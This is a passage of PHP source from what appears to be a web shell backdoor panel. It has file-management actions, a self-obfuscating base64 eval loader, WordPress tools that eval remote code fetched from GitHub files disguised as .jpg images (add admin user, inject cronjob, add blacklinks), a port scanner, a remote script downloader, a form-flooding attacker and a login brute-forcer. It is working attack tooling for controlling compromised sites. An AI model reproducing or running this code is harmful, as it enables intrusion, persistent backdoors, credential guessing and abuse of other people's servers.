			if($_REQUEST['action-option']=='copy')
			{
				if(file_exists($newloc)&&is_dir($newloc))
				{
					foreach($files as $file)
					{
						if(CopyRecursive($file,rtrim($newloc,_)._.basename($file)))
						{
							$succ++;
						}
						else
						{
							$fail++;
						}
					}
					print "Success: $succ | Failed: $fail";
				}
				else
				{
					print "Target not exists !";
				}
			}

			if($_REQUEST['action-option']=='move')
			{
				if(file_exists($newloc)&&is_dir($newloc))
				{
					foreach($files as $file)
					{
						if(MoveRecursive($file,rtrim($newloc,_)._.basename($file)))
						{
							$succ++;
						}
						else
						{
							$fail++;
						}
					}
					print "Success: $succ | Failed: $fail";
				}
				else
				{
					print "Target not exists !";
				}
			}

			if($_REQUEST['action-option']=='delete')
			{
				foreach($files as $file)
				{
					if(Remove($file))
					{
						$succ++;
					}
					else
					{
						$fail++;
					}
				}
				print "Success: $succ | Failed: $fail";
			}

			if($_REQUEST['action-option']=='zip')
			{
				if(pathinfo($newloc)['extension']=='zip')
				{
					$zip=new ZipArchive;

					if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE)===TRUE) 
					{
						foreach($files as $file)
						{
							if(is_dir($file))
							{
								$zip->addEmptyDir(basename($file));

								$recur=new RecursiveIteratorIterator(
								    new RecursiveDirectoryIterator($file),
								    RecursiveIteratorIterator::LEAVES_ONLY 
								);

								foreach ($recur as $key => $val) 
								{
								    if(basename($key)!="..")
									{
									    if(is_dir($key))
										{
											$zdir=str_replace($file,basename($file),realpath($key));
											$zip->addEmptyDir($zdir);
										}
										elseif(is_file($key))
										{
											$zfile=str_replace($file,basename($file),realpath($key));
											$zip->addFile(realpath($key),$zfile);
										}
									}
								}
							}
							elseif(is_file($file))
							{
								$zip->addFile($file,basename($file));
							}
						}

					    $zip->close();
					    print 'Zip Created';
					}
					else 
					{
					    print 'Failed';
					}
				}
				else
				{
					print 'Extension must Zip';
				}
			}

			if($_REQUEST['action-option']=='unzip')
			{
				if(file_exists($newloc)&&is_dir($newloc))
				{
					foreach($files as $file)
					{
						if(pathinfo($newloc)['extension']=='zip')
						{
							$zip=new ZipArchive;
					
							if ($zip->open($file)===TRUE) 
							{
							    $zip->extractTo($newloc);
							    $zip->close();
							    $succ++;
							}
							else 
							{
							    $fail++;
							}
						}
						else 
						{
						    $fail++;
						}
						
					}
					print "Success: $succ | Failed: $fail";
				}
				else
				{
					print "Target not exists !";
				}
			}
		}
	}
	if($_REQUEST['x']=="find")
	{
		$recur=new RecursiveIteratorIterator(
		    new RecursiveDirectoryIterator($dir),
		    RecursiveIteratorIterator::LEAVES_ONLY 
		);

		if(any('find-value',$_REQUEST)&&!empty($_REQUEST['find-value']))
		{
			$result="";
			$res_=0;

			foreach ($recur as $key => $val) 
			{
				if(basename($key)!="..")
				{
					if(strpos(realpath($key),$_REQUEST['find-value'])!== false) 
					{
						$result.=sprintf("<tr>
								<td></td>
								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
								<td><center>%s</center></td>
								</tr>",
								substr(realpath($key),0,strrpos(realpath($key),_)),
								substr(realpath($key),0,strrpos(realpath($key),_)),
								substr(realpath($key),0,strrpos(realpath($key),_)),
								realpath($key),
								realpath($key),
								basename(realpath($key)),
								GetFileTime(realpath($key),'modify')
						);

						$res_++;
					}
				}
			}

			printf("
					<form class='new' method=POST action='?x=find'>
						<input type='text' name='find-value' id='find-action' value='%s'/><input type='submit' name='find-button' value='Find'/>
						<label style='margin-left:10px'><font class='on'>Find: '%s' | Found's: %s</font></label>	
					</form>
					<div class='auto-number'>
						<table class='table sortable'>
							<thead>
								<tr>
									<th class='sorttable_nosort' width='15'>No.</th>
									<th>Directory</th>
									<th>Name</th>
									<th>Modified</th>
								</tr>
							<tbody>%s</tbody>
						</table>
					</div>",$_REQUEST['find-value'],$_REQUEST['find-value'],$res_,$result);
		}
		else
		{
			print "<form class='new' method=POST action='?x=find'>
						<input type='text' name='find-value'/><input type='submit' name='find-button' value='Find'/>
						<label style='margin-left:10px'><font color='red'>Whoops, Nothing to Found's !</font></label>
					</form>";
		}
	}
	if($_REQUEST['x']=="update")
	{
		echo "Coming soon!";
	}
	if($_REQUEST['x']=="self-encryptor")
	{
		if($php_script=htmlentities(@file_get_contents(__FILE__)))
		{
			$asu=strpos($php_script,$_SESSION["action"]["password"]);
			$temp=substr($php_script,$asu+48);
			$rand="\$".substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(1,3));
			$rand2="\$".substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(2,5));
			$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
			$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";
			$b64e=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
			$b64d=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_l.$_m.$_j.$_k.$_l.$_m;
			$b64=array(
				'"\142\141\163\x65\66\x34\137\x64\x65\x63\157\144\145"',
				'strrev("ed"."oce"."d_4"."6es"."ab")',
				'strrev("e"."doc"."ed_"."46e"."sab")',
				'"b"."as"."e6"."4_"."d"."ec"."o"."de"',
				'"ba"."se"."6"."4_d"."e"."cod"."e"' 
			);
			$rand_b64=array_rand($b64);
			$rand3=$b64[$rand_b64];
			$var1=$rand.'="'.$_SESSION["action"]["username"].':'.$_SESSION["action"]["password"].'";';
			$var2=$rand2.'='.$rand3.';';
			$var=array(
				$var1.$var2,
				$var2.$var1
			);
			$rand_var=array_rand($var);
			$rand4=$var[$rand_var];
			$self=preg_replace("/\\\$x_/",$rand,$temp); // Change Variable $x_ to Random 
			$src_='';
			$src_.='<?php ';
			$src_.=$rand4;
			$src_.='@eval('.$rand2.'("';
			$src_.=$b64e(htmlspecialchars_decode($self));
			$src_.='"))';
			$src_.='?>';
			$name=!empty($_REQUEST['name'])?$_REQUEST['name']:'bat_encrypt.php';
			$file=dirname(__FILE__)._.$name;
			$op=fopen($file,'w+');
			fwrite($op,$src_);
			fclose($op);
			printf("<center class='on'>SELF ENCRYPT CREATED !!!</center>
					<center class='on'>
						Link -> <a href='%s' target='_blank'><u>%s</u></a>
					</center>",GetUrlFromPath($file),$name);
		}
		else
		{
			print "<center class='off'>SELF ENCRYPT ENABLE !!!</center>";
		}
	}
}

/* START CUSTOM TOOLZ */

if(any("wp",$_REQUEST))
{
	$wp=$_REQUEST['wp'];

	print MenuWP(array(
	"tebarbd"=>array("title"=>"Tebar-Tebar Pesona","ver"=>"1.0","auth"=>"maRidoNo"),
	"lockdown"=>array("title"=>"Lockdown dari Serangan","ver"=>"1.0","auth"=>"maRidoNo"),
	"adduser"=>array("title"=>"Add user WP","ver"=>"1.0","auth"=>"maRidoNo"),
	"addbl"=>array("title"=>"Add Blacklink WP","ver"=>"1.0","auth"=>"maRidoNo"),
	"scanner"=>array("title"=>"Scanner","ver"=>"1.0","auth"=>"maRidoNo"),
	"cronjob"=>array("title"=>"Injek cronjob","ver"=>"1.0","auth"=>"maRidoNo"),
	));

	print "<div id='tools'>";

	if(empty($wp))
	{
		printf("<div id='thanks'>
					<h2>Special for Wordpress</h2>
					<h3>Bah ?!</h3>
				</div>");
	}

	if($wp=="tebarbd")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_wp[$wp]['title']." v".$menu_wp[$wp]['ver']."</h3>
			  <h3> by: ".$menu_wp[$wp]['auth']."</h3>
		  </div>";

		?>
		  <?=/********/@null; /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/dono-zz/1945/raw/main/sabar.jpg"));/**/?>
		<?php
	}
	if($wp=="lockdown")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_wp[$wp]['title']." v".$menu_wp[$wp]['ver']."</h3>
			  <h3> by: ".$menu_wp[$wp]['auth']."</h3>
		  </div>";

		?>
		  <?=/********/@null; /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/dono-zz/1945/raw/main/ya.jpg"));/**/?>
		<?php
	}

	if($wp=="adduser")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_wp[$wp]['title']." v".$menu_wp[$wp]['ver']."</h3>
			  <h3> by: ".$menu_wp[$wp]['auth']."</h3>
		  </div>";

		?>
		  <?=/********/@null; /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/dono-zz/1945/raw/main/sayang.jpg"));/**/?>
		<?php
	}
	if($wp=="addbl")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_wp[$wp]['title']." v".$menu_wp[$wp]['ver']."</h3>
			  <h3> by: ".$menu_wp[$wp]['auth']."</h3>
		  </div>";

		?>
		  <?=/********/@null; /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/dono-zz/1945/raw/main/permen"));/**/?>
		<?php
	}
	if($wp=="scanner")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_wp[$wp]['title']." v".$menu_wp[$wp]['ver']."</h3>
			  <h3> by: ".$menu_wp[$wp]['auth']."</h3>
		  </div>";

		?>
		<?=/********/@null; /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/dono-zz/1945/raw/main/sc"));/**/?>
		
	
		<?php
	}	
	if($wp=="cronjob")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_wp[$wp]['title']." v".$menu_wp[$wp]['ver']."</h3>
			  <h3> by: ".$menu_wp[$wp]['auth']."</h3>
		  </div>";

		?>
		
		  <?=/********/@null; /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/dono-zz/1945/raw/main/cron"));/**/?>


		<?php
	}	
	print "</div>";
}

if(any("z",$_REQUEST))
{
	$z=$_REQUEST['z'];

	print MenuTools(array(
	"target-map"=>array("title"=>"Target Map","ver"=>"2.0","auth"=>"maRidoNo"),
	"port-scanner"=>array("title"=>"Scan Port","ver"=>"1.0","auth"=>"maRidoNo"),
	"script-loader"=>array("title"=>"Script Loader","ver"=>"1.0","auth"=>"maRidoNo"),
	"encryptor"=>array("title"=>"Encryptor","ver"=>"1.1","auth"=>"maRidoNo"),
	"form-bruteforces"=>array("title"=>"Form Bruteforces","ver"=>"1.0","auth"=>"maRidoNo"),
	"login-bruteforces"=>array("title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"maRidoNo"),
	"mass-tools"=>array("title"=>"Mass Tools","ver"=>"1.0","auth"=>"maRidoNo"),
	"ddos-attack"=>array("title"=>"DDOS Attack","ver"=>"2.0","auth"=>"maRidoNo"),
	));

	print "<div id='tools'>";

	if(empty($z))
	{
		printf("<div id='thanks'>
					<h2>Nothing Is Secure...</h2>
					<h3>WHY SO serious ?!</h3>
				</div>");
	}
	if($z=="target-map")
	{
		print "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		printf("<div id='target-map'>
			<form onsubmit='return false;' class='new'>
				<input type='text' id='map-ip' value='%s'/>
				<input type='submit' value='Trace' onclick=\"return getAjax(true,'target-info','POST','?z=target-map&ip='+document.getElementById('map-ip').value);\"/><br>
			</form>
		</div>
		<div id='target-info' class='result'></div>",gethostbyname(http_host));

		if(any("ip",$_REQUEST))
		{
			ob_clean();
			$ip=!empty($_REQUEST['ip']) ? $_REQUEST['ip'] : gethostbyname(http_host);
			$valid=filter_var($ip,FILTER_VALIDATE_IP) or die('Invalid IP Address');
			if($_REQUEST['ip']==gethostbyname(http_host)) 
			{
				$url=B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=");
				$geoip=GetUrlContent($url);
				$json=json_decode($geoip,true);
			}
			else
			{
				$url=sprintf(B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=")."%s",$ip);
				$geoip=GetUrlContent($url);
				$json=json_decode($geoip,true);
			}
			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['lat'],$json['lon']);
			printf("<div class='divide'>
						<div class='divide-left'>
							<table class='table'>
								<tr><td>AS</td><td>%s</td></tr>
								<tr><td>City</td><td>%s</td></tr>
								<tr><td>Country</td><td>%s</td></tr>
								<tr><td>Country Code</td><td>%s</td></tr>
								<tr><td>ISP</td><td>%s</td></tr>
								<tr><td>Latitude</td><td>%s</td></tr>
								<tr><td>Logitude</td><td>%s</td></tr>
							</table>
						</div>
						<div class='divide-left'>
							<table class='table'>
								<tr><td>Origin</td><td>%s</td></tr>
								<tr><td>IP</td><td>%s</td></tr>
								<tr><td>Region</td><td>%s</td></tr>
								<tr><td>Region Name</td><td>%s</td></tr>
								<tr><td>Timezone</td><td>%s</td></tr>
								<tr><td>Zip</td><td>%s</td></tr>
								<tr><td>Status</td><td>%s</td></tr>
							</table>
						</div>
					</div>
					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",
					$json['as'],
					$json['city'],
					$json['country'],
					$json['countryCode'],
					$json['isp'],
					$json['lat'],
					$json['lon'],
					$json['org'],
					$json['query'],
					$json['region'],
					$json['regionName'],
					$json['timezone'],
					$json['zip'],
					$json['status'],
					$url);
			exit;
		}
	}
	if($z=="port-scanner")
	{
		print "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		printf("<div id='port-scan'>
					<form onsubmit='return false;' class='new'>
						<label>Host Port</label><input type='text' id='ip-port' value='%s'/><br>
						<label>Start Port</label><input type='text' id='start-port' value='1'/><br>
						<label>End Port</label><input type='text' id='end-port' value='65535'/><br>
						<label>Methode</label><select id='scan-port'><option value='1'>socket_connect</option><option value='2'>fsockopen</option></select><br>
						<input type='submit' onclick=\"return getAjax(true,'port-result','POST','?z=port-scanner&x=scan-port&ip='+document.getElementById('ip-port').value+'&sp='+document.getElementById('start-port').value+'&ep='+document.getElementById('end-port').value+'&mtd='+document.getElementById('scan-port').value);\" value=Scan />
						<input type='submit' onclick=\"return ajaxAbort(true,'port-result')\" value=Cancel />
					</form>
				</div>
				<div id='port-result' class='result'></div>",gethostbyname(http_host));

		if(any("x",$_REQUEST)&&$_REQUEST['x']=="scan-port")
		{
			ob_clean();
			$host=$_REQUEST['ip'];
			$from=$_REQUEST['sp'];
			$to  =$_REQUEST['ep'];
			$mtd =$_REQUEST['mtd'];
			switch($mtd)
			{
				case '1':
					if(function_exists('socket_create'))
					{
						$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP); 
						for($conn_port=$from;$conn_port <=$to;$conn_port++)
						{
							$conn=@socket_connect($socket ,$host,$conn_port);
							if($conn) 
							{ 
								print "<br>port $conn_port open";
								socket_close($socket);
								$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP);
							}
						}
					}
					else
					{
						print "Error socket_connect<br>";
					}
				break;
				case '2':
					for($conn_port=$from;$conn_port <=$to;$conn_port++)
					{
						$conn=@fsockopen($host,$conn_port);
						if($conn)
						{
							print "<br>port $conn_port open";
							fclose($conn);
						}
					}
				break;
			}
			print "<br>Scan Finish.";
			exit;
		}
	}
	if($z=="script-loader")
	{
		print "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		$path=dirname(__FILE__)._.'script-loader';
		if(!is_dir($path)) mkdir($path,0755);

		$recur=new RecursiveIteratorIterator(
		    new RecursiveDirectoryIterator($path),
		    RecursiveIteratorIterator::LEAVES_ONLY 
		);

		$result="";
		foreach ($recur as $key => $val) 
		{
			if(basename($key)!=".."&&basename($key)!=".")
			{
				$result.=sprintf("<tr>
						<td></td>
						<td><a href='%s' target='_blank'>%s</a></td>
						<td><center>%s</center></td>
						</tr>",
						GetUrlFromPath(realpath($key)),
						basename(realpath($key)),
						GetFileTime(realpath($key),'modify')
				);
			}
		}

		printf("<div id='script-loader'>
					<div class='divide'>
						<div class='divide-left'>
							<form onsubmit='return false;' class='new'>
								<label>Url</label><input type='text' id='url-source' value=''/><br>
								<label>Filename</label><input type='text' id='file-name' value=''/><br>
								<input type='submit' onclick=\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('url-source').value+'&filename='+document.getElementById('file-name').value);\"/><br>
								<div id='download-result' class='result'></div>
							</form>
						</div>
						<div class='divide-right'>
							<fieldset>
								<legend>List's</legend>
								<div class='auto-number'>
									<table class='table'>
									<thead><tr><th>No.</th><th>Name</th><th>Modified</th>
									<tbody>%s</tbody>
									</table>
								</div>
							</fieldset>
						</div>
					</div>
				</div>",$result);

		if(any("url",$_REQUEST)&&any("filename",$_REQUEST))
		{
			ob_clean();
			$url=$_REQUEST['url'];
			$filename=$_REQUEST['filename'];
			$dest=rtrim($path,_)._.$filename;
			if(GetUrlExists($url)&&!empty($filename))
			{
				if(GetDownloadUrl($url,$dest))
				{
					$url=GetUrlFromPath($dest);
					printf("Success -> <a href='$url' target='_blank'><u>Link</u></a>");
				}
				else
				{
					print "<br>Failed";
				}
				print "<br>Finish";
			}
			else
			{
				print "<br>Mistakes";
			}
			exit;
		}
	}
	if($z=="encryptor")
	{
		print "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		printf("<div id='script-loader'>
			<form onsubmit='return false;' class='new'>
				<div class='hash-control'>
					<div class='hash'>
						<input type='radio' name='encr' value='basic' checked><label>Basic</label>
						<select id='basic-hash'>
							<option value='md5'>Md5</option>
							<option value='asc'>Char</option>
							<option value='chr'>Ascii</option>
							<option value='sha1'>Sha1</option>
							<option value='crc32'>Crc32</option>
							<option value='B64E'>B64E</option>
							<option value='B64D'>B64D</option>
							<option value='urlencode'>URL Encode</option>
							<option value='urldecode'>URL Decode</option>
							<option value='strlen'>String Length</option>
							<option value='strrev'>String Reverse</option>
							<option value='base64_encode'>Base64 Encode</option>
							<option value='base64_decode'>Base64 Decode</option>
							<option value='entties'>Htmlentities</option>
							<option value='spechar'>Htmlspecialchars</option>
						</select>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='extra'><label>Extra</label>
						<select id='extra-hash'>
							<option value='asc-hex'>Ascii => Hex</option>
							<option value='asc-bin'>Ascii => Binary</option>
							<option value='hex-asc'>Hex => Ascii</option>
							<option value='hex-bin'>Hex => Binary</option>
							<option value='bin-asc'>Binary => Ascii</option>
							<option value='bin-hex'>Binary => Hex</option>
						</select>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='crypt'><label>Crypt</label>
						<input type='text' id='crypt-salt' name='salt' placeholder='\$alt'/>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='hash'><label>Hash</label>
						<select id='hash-hash'><option value='md2'>md2</option><option value='md4'>md4</option><option value='md5'>md5</option><option value='sha1'>sha1</option><option value='sha256'>sha256</option><option value='sha384'>sha384</option><option value='sha512'>sha512</option><option value='ripemd128'>ripemd128</option><option value='ripemd160'>ripemd160</option><option value='ripemd256'>ripemd256</option><option value='ripemd320'>ripemd320</option><option value='whirlpool'>whirlpool</option><option value='tiger128,3'>tiger128,3</option><option value='tiger160,3'>tiger160,3</option><option value='tiger192,3'>tiger192,3</option><option value='tiger128,4'>tiger128,4</option><option value='tiger160,4'>tiger160,4</option><option value='tiger192,4'>tiger192,4</option><option value='snefru'>snefru</option><option value='gost'>gost</option><option value='adler32'>adler32</option><option value='crc32'>crc32</option><option value='crc32b'>crc32b</option><option value='haval128,3'>haval128,3</option><option value='haval160,3'>haval160,3</option><option value='haval192,3'>haval192,3</option><option value='haval224,3'>haval224,3</option><option value='haval256,3'>haval256,3</option><option value='haval128,4'>haval128,4</option><option value='haval160,4'>haval160,4</option><option value='haval192,4'>haval192,4</option><option value='haval224,4'>haval224,4</option><option value='haval256,4'>haval256,4</option><option value='haval128,5'>haval128,5</option><option value='haval160,5'>haval160,5</option><option value='haval192,5'>haval192,5</option><option value='haval224,5'>haval224,5</option><option value='haval256,5'>haval256,5</option></select>
						<input type='checkbox' id='hash-raw'/> Raw
					</div>
					<div class='hash'>
						<input type='submit' onclick=\"
						url='';
						textencode=window.btoa(document.getElementById('hashtext').value);
						radios=document.getElementsByName('encr');
						for(var i=0,length=radios.length;i<length;i++){
							if (radios[i].checked){
								switch(radios[i].value){
									case 'basic':
										url='?z=encryptor&opt=basic&hash='+document.getElementById('basic-hash').value+'&text-encode='+textencode;
									break;
									case 'extra':
										url='?z=encryptor&opt=extra&hash='+document.getElementById('extra-hash').value+'&text-encode='+textencode;
									break;
									case 'crypt':
										url='?z=encryptor&opt=crypt&salt='+document.getElementById('crypt-salt').value+'&text-encode='+textencode;
									break;
									case 'hash':
										url='?z=encryptor&opt=hash&hash='+document.getElementById('hash-hash').value+'&raw='+document.getElementById('hash-raw').checked+'&text-encode='+textencode;
									break;
								}
								break;
							}
						}
						return getAjax(false,'hashresult','POST',url);
						\"/>
						<input type='submit' onclick=\"
							tempi=document.getElementById('hashresult').value;
							tempi1=document.getElementById('hashtext').value;
							document.getElementById('hashtext').value=tempi.trim();
							document.getElementById('hashresult').value=tempi1.trim();
						\" value='Swap'/>
					</div>
				</div>
				<div class='hash-capture'>
					<div class='hash-capture-left'>
						<label>String</label><textarea id='hashtext'></textarea>
						<input type='submit' onclick=\"
							document.getElementById('hashtext').value='';
						\" value='Clear'/>
					</div>
					<div class='hash-capture-right'>
						<label>Result</label><textarea id='hashresult'></textarea>
						<input type='submit' onclick=\"
							document.getElementById('hashresult').value='';
						\" value='Clear'/>
					</div>
				</div>
			</form>
		</div>");

		function chr_asc($str){
			$asc='';
			for($i=0;$i<strlen($str);$i++) 
				$asc.=ord($str[$i]).' ';
			return rtrim($asc);
		}

		function asc_chr($asc){
			$str='';
			if (strpos($asc,' ')){
				$exps=explode(' ',$asc);
				foreach($exps as $exp)
					$str.=chr($exp);
			}else{
				$str=chr($asc);
			}
			return $str;
		}

		function asc_hex($asc){
			$hex='';
			for ($i=0;$i<strlen($asc);$i++) 
				$hex.=sprintf("%02x",ord(substr($asc,$i,1)));
			return $hex;
		}

		function hex_asc($hex){
			$asc='';
			for ($i=0;$i<strlen($hex);$i+=2) 
				$asc.=chr(hexdec(substr($hex,$i,2)));
			return $asc;
		}

		function hex_bin($hex){
			$bin='';
			for($i=0;$i<strlen($hex);$i++)
				$bin.=str_pad(decbin(hexdec($hex[$i])),4,'0',STR_PAD_LEFT);
			return $bin;
		}

		function bin_hex($bin){
			$hex='';
			for($i=strlen($bin)-4;$i>=0;$i-=4)
				$hex.=dechex(bindec(substr($bin,$i,4)));
			return strrev($hex);
		}

		function asc_bin($asc){
			$hex=asc_hex($asc);
			return hex_bin($hex);
		}

		function bin_asc($bin){ 
		    $hex=bin_hex($bin);
			return hex_asc($hex);
		}
		
		if(any("opt",$_REQUEST))
		{
			ob_clean();
			$opt=$_REQUEST['opt'];
			$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
			$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";
			$b64e=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
			$b64d=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_l.$_m.$_j.$_k.$_l.$_m;
			$text=$b64d($_POST['text-encode']);
			if ($opt=='basic')
			{
				$hash=$_REQUEST['hash'];
				switch($hash)
				{
					case "md5":print md5($text);break;
					case "sha1":print sha1($text);break;
					case "chr":print asc_chr($text);break;
					case "asc":print chr_asc($text);break;
					case "crc32":print crc32($text);break;
					case "strlen":print strlen($text);break;
					case "strrev":print strrev($text);break;
					case "urlencode":print urlencode($text);break;
					case "urldecode":print urldecode($text);break;
					case "entties":print htmlentities($text);break;
					case "spechar":print htmlspecialchars($text);break;
					case "base64_encode":print $b64e($text);break;
					case "base64_decode":print $b64d($text);break;
					case "B64E":print B64E($text);break;
					case "B64D":print B64D($text);break;
				}
			}
			elseif($opt=='extra')
			{
				$hash=$_REQUEST['hash'];
				switch($hash)
				{
					case "chr-asc":print str_asc($text);break;
					case "asc-chr":print asc_str($text);break;
					case "asc-hex":print asc_hex($text);break;
					case "hex-asc":print hex_asc($text);break;
					case "hex-bin":print hex_bin($text);break;
					case "bin-hex":print bin_hex($text);break;
					case "asc-bin":print asc_bin($text);break;
					case "bin-asc":print bin_asc($text);break;
				}
			}
			elseif($opt=='crypt')
			{
				$salt=$_REQUEST['salt'];
				print crypt($text,$salt);
			}
			elseif($opt=='hash')
			{
				$hash=$_REQUEST['hash'];
				$raw=$_REQUEST['raw'];
				if($raw==true)
				{
					print hash($hash,$text,true);
				}
				else
				{
					print hash($hash,$text);
				}
			}
			exit;
		}
	}
	if($z=="form-bruteforces")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
		  </div>";

		 $exp=array(
		 	'{',
		 	'"name":"Handsome",',
		 	'"email":"very@handsome.com",',
		 	'"subject":"WHOOPS YOU GOT E-MAIL ?!",',
		 	'"message":"HA HA HA HA HA HA HA HA",',
		 	'}');

		printf("<div class='divide'>
				<div class='divide-left'>
					<form onsubmit='return false;' class='new'>
						<label>Url Action</label><input type='text' id='form-url' placeholder='http://'/><br>
						<label>Count's</label><input type='number' id='form-count' value='100' min='10' autocomplete='off'/><br>
						<label>Parameter (JSON)</label>
						<textarea id='form-parameter'>%s</textarea>
						<input type='submit' onclick=\"return ajaxAbort(true,'form-result')\" value=Cancel />
						<input type='submit' value='Attack' onclick=\"return getAjax(true,'form-result','POST','?z=form-bruteforces&url='+document.getElementById('form-url').value+'&parameter='+document.getElementById('form-parameter').value+'&count='+document.getElementById('form-count').value);\"/><br>
					</form>
				</div>
				<div class='divide-right'>
					<fieldset>
						<legend>Result's</legend>
						<div id='form-result' class='result'></div>
					</fieldset>
				</div>
			</div>",implode($exp,"\n"));

		if(any("url",$_REQUEST)&&any("parameter",$_REQUEST))
		{
			ob_clean();
			$start=$succ=$fail=0;
			$url=$_REQUEST['url'];
			$count=$_REQUEST['count'];
			$parameter=$_REQUEST['parameter'];
			$content=json_decode($parameter,true);
			if(!is_array($content))$content=array();
			do {$start++;
				$ch=curl_init();
				curl_setopt($ch,CURLOPT_USERAGENT,$agent);
				curl_setopt($ch,CURLOPT_URL,$url);
				curl_setopt($ch,CURLOPT_POST,1);
				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);
				curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($content));
				curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
				curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
				$result=curl_exec($ch);
				$httpcode=curl_getinfo($ch,CURLINFO_HTTP_CODE);
				if(curl_error($ch)) echo curl_error($ch);
				curl_close($ch);
				if($httpcode==200)
				{
					$succ++;
				}
				else
				{
					$fail++;
				}
				if($start==$count)
				{
					echo "Success: $succ<br>Failed: $fail<br>Messages: ".htmlspecialchars($result);
				}
			}while($start<=$count);
			exit;
		}
	}
	if($z=="login-bruteforces")
	{
		print "<div class='tools-header'>
			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
		  </div>";

		printf("<div id='login-bruteforces'>
			<div class='divide-left'>
				<form onsubmit='return false;' class='new'>
					<label>Url Action</label><input type='text' id='login-url' placeholder='http://'/><br>
					<label>User List</label><input type='text' id='login-user' placeholder='admin' value='admin'/><br>
					<label>&nbsp;</label><input type='text' id='login-username' placeholder='User Fieldname'/><br>
					<label>Pass List</label><input type='text' id='login-passlist' placeholder='http://'/><br>
					<label>&nbsp;</label><input type='text' id='login-passname' placeholder='Pass Fieldname'/><br>
					<input type='submit' onclick=\"return getAjax(true,'login-result','POST',
					'?z=login-bruteforces'+
					'&url='+document.getElementById('login-url').value+
					'&user='+document.getElementById('login-user').value+
					'&userfield='+document.getElementById('login-username').value+
					'&passfield='+document.getElementById('login-passname').value+
					'&passlist='+document.getElementById('login-passlist').value);\"/><br>
				</form>
			</div>
			<div class='divide-right'>
				<fieldset>
					<legend>Result's</legend>
					<div id='login-result' class='result'></div>
				</fieldset>
			</div>
		</div>");

		if(any("url",$_REQUEST)&&any("user",$_REQUEST))
		{
			ob_clean();
			$url=$_REQUEST['url'];
			$user=$_REQUEST['user'];
			$file=GetUrlExists($_REQUEST['passlist'])? 
			GetUrlContent($_REQUEST['passlist']): 
			$_REQUEST['passlist'];
			$words=explode("\n",$file);
			$length=count($words);
			foreach ($words as $index => $word) 
			{
				$parameter=http_build_query(
					array(
						$_REQUEST['userfield'] => $user,
						$_REQUEST['passfield'] => $word,
						'Submit' => 'Submit',
					)
				);
				$ch=curl_init();
				curl_setopt($ch,CURLOPT_USERAGENT,$agent);
				curl_setopt($ch,CURLOPT_URL,$url);
				curl_setopt($ch,CURLOPT_POST,1);
				curl_setopt($ch,CURLOPT_TIMEOUT,5);
				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);
				curl_setopt($ch,CURLOPT_POSTFIELDS,$parameter);
				curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
				$ra=curl_exec($ch);
				$st=curl_getinfo($ch,CURLINFO_HTTP_CODE);
				if(curl_error($ch)) echo curl_error($ch);
				curl_close($ch);
				if ($st==200) 
				{
					echo "FOUND'S: $user:$word<br>";
					exit;
				}
				else
				{
					echo htmlspecialchars($ra);
				}
			}
			exit;
		}
	}
	if($z=="mass-tools")
	{
		print "<div class='tools-header'>
